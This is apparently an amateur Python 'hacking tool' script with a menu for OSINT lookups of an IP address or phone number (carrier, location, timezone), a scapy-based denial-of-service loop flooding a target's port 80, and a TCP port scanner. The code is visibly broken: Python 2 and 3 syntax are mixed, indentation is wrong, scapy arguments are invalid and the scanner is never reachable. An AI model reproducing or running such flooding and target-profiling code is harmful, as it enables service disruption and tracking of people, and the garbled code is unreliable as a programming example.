import os
import time 
from subprocess import *
import requests
import json
import phonenumbers
from phonenumbers import carrier, geocoder, timezone
from scapy.all import *

def options():
    osint()
    dos()

def osint():
    if user == '1':
        oslnt = input("ip or phone: ")
        if oslnt == 'ip':
            clear()
            ip = input("ip of target: ")
            iplook = requests.get('https://ipapi.co/'+ip+'/json/')
            print(iplook.content)
        if oslnt == 'phone':
            clear()
            phoneNumber = input("Enter phone number with country code(+1): ")
            phoneNumber = phonenumbers.parse(phoneNumber)
            print("Timezone:",timezone.time_zones_for_number(phoneNumber))
            print("Carrier:",carrier.name_for_number(phoneNumber, "en"))  
            print("Location:",geocoder.description_for_number(phoneNumber, "en"))

def dos():
    if user == '2':
        source_IP = input("Enter IP address of Source: ")
        target_IP = input("Enter IP address of Target: ")
        source_port = int(input("Enter Source Port Number:"))
        i = 1

        while True:
            IP1 = IP(source_IP = source_IP, destination = target_IP)
            TCP1 = TCP(srcport = source_port, dstport = 80)
            pkt = IP1 / TCP1
            send(pkt, inter = .001)
            print ("packet sent ", i)
            i = i + 1

def portscan():
    if user == '3':
        remoteServer = raw_input("Enter a remote host to scan: ")
        remoteServerIP = socket.gethostbyname(remoteServer)
        print ("-" * 60)
        print ("Please wait, scanning remote host", remoteServerIP)
        print ("-" * 60)

        t1 = datetime.now()

        try:
    for port in range(1,1025):  
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result = sock.connect_ex((remoteServerIP, port))
        if result == 0:
            print "Port {}:      Open".format(port)
        sock.close()

    except KeyboardInterrupt:
        print "You pressed Ctrl+C"
        sys.exit()

    except socket.gaierror:
        print 'Hostname could not be resolved. Exiting'
        sys.exit()

    except socket.error:
        print "Couldn't connect to server"
        sys.exit()

# Checking the time again
    t2 = datetime.now()

# Calculates the difference of time, to see how long it took to run the script
    total =  t2 - t1

# Printing the information to screen
    print 'Scanning Completed in: ', total
   
def clear():
    _ = call('clear' if os.name =='posix' else 'cls')

print("starting in 5..4..3..2..1") 
time.sleep(1)
clear()

print("___________________")
print("|                 |")
print("|  (1) OSINT      |")
print("|                 |")
print("|  (2) DOS        |")
print("|                 |")
print("|  (3) Port Scan  |")
print("|_________________|")
print()
user = input("option: ")
clear()
options()

